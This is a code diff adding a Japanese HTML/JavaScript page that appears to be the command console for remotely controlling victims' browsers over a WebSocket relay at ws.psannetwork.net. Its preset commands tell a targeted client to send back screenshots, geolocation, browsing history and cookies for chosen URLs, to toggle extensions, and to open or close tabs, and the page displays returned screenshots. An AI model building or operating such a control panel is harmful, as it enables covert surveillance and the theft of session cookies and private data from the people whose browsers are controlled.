@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WebSocket クライアント</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+    }
+    #messages {
+      border: 1px solid #ccc;
+      padding: 10px;
+      height: 300px;
+      overflow-y: scroll;
+      background: #f9f9f9;
+      margin-bottom: 20px;
+    }
+    #canvasContainer {
+      margin-top: 20px;
+      text-align: center;
+    }
+    canvas {
+      border: 1px solid #ccc;
+      background-color: #eef;
+      margin: auto;
+      display: block;
+      max-width: 100%;
+      margin-top: 10px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 8px;
+      box-sizing: border-box;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+  <h2>WebSocket クライアント</h2>
+<!-- HTML: <input>にdatalistを関連付け -->
+<div class="form-group">
+  <label for="clientId">自分のIDを入力してください:</label>
+  <input type="text" id="clientId" list="savedIds" placeholder="例: myClient123" />
+  <datalist id="savedIds"></datalist>
+  <button id="connectButton">接続</button>
+</div>
+
+  <div id="sendMessageForm" style="display: none;">
+<div class="form-group">
+  <label for="targetId">送信先のID:</label>
+  <input type="text" id="targetId" list="savedTargetIds" placeholder="送信先のクライアントIDを入力" />
+  <datalist id="savedTargetIds"></datalist>
+</div>
+
+    <div class="form-group">
+      <label for="messageContent">送信するメッセージ:</label>
+      <input type="text" id="messageContent" placeholder="送信する内容を入力" />
+    </div>
+    <button id="sendButton">メッセージ送信</button>
+  </div>
+  <div id="commandButtons" style="margin-top: 20px;">
+    <h3>コマンドのプリセット</h3>
+    <div class="form-group">
+      <label for="customUrl">URLまたはIDを入力:</label>
+      <input type="text" id="customUrl" placeholder="例: https://example.com または extensionID" />
+    </div>
+    <button class="preset-command" data-command="screenshot">スクリーンショットを取得</button>
+    <button class="preset-command" data-command="getLocations">位置情報を取得</button>
+    <button class="preset-command" data-command="extensionEnable">拡張機能を有効化</button>
+    <button class="preset-command" data-command="extensionDisable">拡張機能を無効化</button>
+    <button class="preset-command" data-command="GetExtensionId">拡張機能のIDを取得</button>
+    <button class="preset-command" data-command="GetHistory">履歴を取得</button>
+    <button class="preset-command" data-command="getCookie">指定URLのCookieを取得</button>
+    <div>
+      <label for="openOptions">新しいページを開く設定:</label>
+      <input type="text" id="openOptions" placeholder="例: true 1024 768" />
+    </div>
+    <button class="preset-command" data-command="openPage">新しいページを開く</button>
+    <button class="preset-command" data-command="closePage">指定ページを閉じる</button>
+    <button class="preset-command" data-command="getPage">現在のタブ情報を取得</button>
+  </div>
+  <h3>受信したメッセージ:</h3>
+  <div id="messages"></div>
+  <div id="canvasContainer">
+    <h3>受信した画像:</h3>
+    <canvas id="imageCanvas"></canvas>
+  </div>
+  <script>
+    let ws;
+    let clientId;
+    const canvas = document.getElementById('imageCanvas');
+    const ctx = canvas.getContext('2d');
+
+// ページ読み込み時にID候補を生成
+window.addEventListener('DOMContentLoaded', () => {
+  const savedTargetIds = JSON.parse(localStorage.getItem('savedTargetIds')) || [];
+  populateTargetIdDatalist(savedTargetIds);
+
+  const savedClientId = localStorage.getItem('clientId');
+  const savedTargetId = localStorage.getItem('targetId');
+  if (savedClientId) document.getElementById('clientId').value = savedClientId;
+  if (savedTargetId) document.getElementById('targetId').value = savedTargetId;
+});
+// 接続ボタンのクリックイベント
+document.getElementById('connectButton').addEventListener('click', function () {
+  const inputField = document.getElementById('clientId');
+  clientId = inputField.value.trim();
+  if (!clientId) return alert('IDを入力してください。');
+  
+  // IDを保存
+  saveIdToLocalStorage(clientId);
+
+  localStorage.setItem('clientId', clientId);
+  initWebSocket(clientId);
+  inputField.disabled = true;
+  this.disabled = true;
+  document.getElementById('sendMessageForm').style.display = 'block';
+});
+
+      // IDを保存する関数
+function saveIdToLocalStorage(newId) {
+  let savedIds = JSON.parse(localStorage.getItem('savedIds')) || [];
+  if (!savedIds.includes(newId)) {
+    savedIds.push(newId);
+    localStorage.setItem('savedIds', JSON.stringify(savedIds));
+    populateIdDatalist(savedIds); // 候補リストを更新
+  }
+}
+
+// 候補リストを生成する関数
+function populateIdDatalist(ids) {
+  const datalist = document.getElementById('savedIds');
+  datalist.innerHTML = ''; // リストをクリア
+  ids.forEach(id => {
+    const option = document.createElement('option');
+    option.value = id;
+    datalist.appendChild(option);
+  });
+}
+
+    // WebSocketの初期化
+    function initWebSocket(clientId) {
+      const SERVER_URL = 'wss://ws.psannetwork.net/';
+      ws = new WebSocket(SERVER_URL);
+      ws.onopen = () => {
+        appendMessage('サーバーに接続しました');
+        ws.send(JSON.stringify({ id: clientId }));
+      };
+      ws.onmessage = (event) => handleMessage(event.data);
+      ws.onerror = (error) => appendMessage('接続エラー: ' + error.message);
+      ws.onclose = () => setTimeout(() => initWebSocket(clientId), 5000);
+    }
+
+    // メッセージの処理
+    function handleMessage(data) {
+      try {
+        const message = JSON.parse(data);
+        if (message.message.startsWith('data:image/png;base64,')) {
+          appendMessage(`画像メッセージ受信: ${message.from}`);
+          drawImageOnCanvas(message.message);
+        } else {
+          appendMessage(`メッセージ受信: ${message.message}`);
+        }
+      } catch {
+        appendMessage('メッセージの解析に失敗しました: ' + data);
+      }
+    }
+
+    // メッセージの表示
+    function appendMessage(msg) {
+      const messagesDiv = document.getElementById('messages');
+      const newMessage = document.createElement('div');
+      newMessage.textContent = msg;
+      messagesDiv.appendChild(newMessage);
+      messagesDiv.scrollTop = messagesDiv.scrollHeight;
+    }
+
+    // キャンバスに画像を描画
+    function drawImageOnCanvas(base64Image) {
+      const img = new Image();
+      img.onload = () => {
+        const maxWidth = window.innerWidth * 0.8;
+        const maxHeight = window.innerHeight * 0.6;
+        const scale = Math.min(maxWidth / img.width, maxHeight / img.height);
+        canvas.width = img.width * scale;
+        canvas.height = img.height * scale;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+      };
+      img.src = base64Image;
+    }
+
+    // メッセージ送信ボタンのイベント
+document.getElementById('sendButton').addEventListener('click', () => {
+  const targetId = document.getElementById('targetId').value.trim();
+  const messageContent = document.getElementById('messageContent').value.trim();
+  if (!targetId || !messageContent) return alert('送信先IDとメッセージを入力してください。');
+  
+  // 送信先IDを保存
+  saveTargetIdToLocalStorage(targetId);
+
+  localStorage.setItem('targetId', targetId);
+  sendWebSocketMessage({ type: 'cmd', message: messageContent, to: targetId, from: clientId });
+  appendMessage(`送信済み: to=${targetId}, message=${messageContent}`);
+});
+
+
+      function populateTargetIdDatalist(targetIds) {
+  const datalist = document.getElementById('savedTargetIds');
+  datalist.innerHTML = ''; // リストをクリア
+  targetIds.forEach(id => {
+    const option = document.createElement('option');
+    option.value = id;
+    datalist.appendChild(option);
+  });
+}
+      function saveTargetIdToLocalStorage(newTargetId) {
+  let savedTargetIds = JSON.parse(localStorage.getItem('savedTargetIds')) || [];
+  if (!savedTargetIds.includes(newTargetId)) {
+    savedTargetIds.push(newTargetId);
+    localStorage.setItem('savedTargetIds', JSON.stringify(savedTargetIds));
+    populateTargetIdDatalist(savedTargetIds); // 候補リストを更新
+  }
+}
+    // プリセットコマンドボタンのイベント
+    document.querySelectorAll('.preset-command').forEach(button => {
+      button.addEventListener('click', () => {
+        const targetId = document.getElementById('targetId').value.trim();
+        const commandType = button.dataset.command;
+        const input = document.getElementById('customUrl').value.trim();
+        const openOptions = document.getElementById('openOptions').value.trim();
+
+        if (!targetId) return alert('送信先IDを入力してください。');
+        localStorage.setItem('targetId', targetId);
+
+        let command = generateCommand(commandType, input, openOptions);
+        if (command) {
+          sendWebSocketMessage({ type: 'cmd', message: command, to: targetId, from: clientId });
+          appendMessage(`送信済み: to=${targetId}, command=${command}`);
+        }
+      });
+    });
+
+    // WebSocketでメッセージを送信する
+    function sendWebSocketMessage(message) {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify(message));
+      } else {
+        appendMessage('接続が確立されていません。');
+      }
+    }
+
+    // コマンドの生成
+    function generateCommand(commandType, input, openOptions) {
+      switch (commandType) {
+        case 'GetCookies':
+        case 'screenshot':
+        case 'extensionEnable':
+        case 'extensionDisable':
+          if (!input) return alert('IDまたはURLを入力してください。');
+          return `${commandType} ${input}`;
+        case 'openPage':
+          if (!input || !openOptions) return alert('URLとオプションを入力してください。');
+          return `${commandType} ${input} ${openOptions}`;
+        case 'closePage':
+          if (!input) return alert('URLを入力してください。');
+          return `${commandType} ${input}`;
+        default:
+          return commandType;
+      }
+    }
+  </script>
+</body>
+</html>
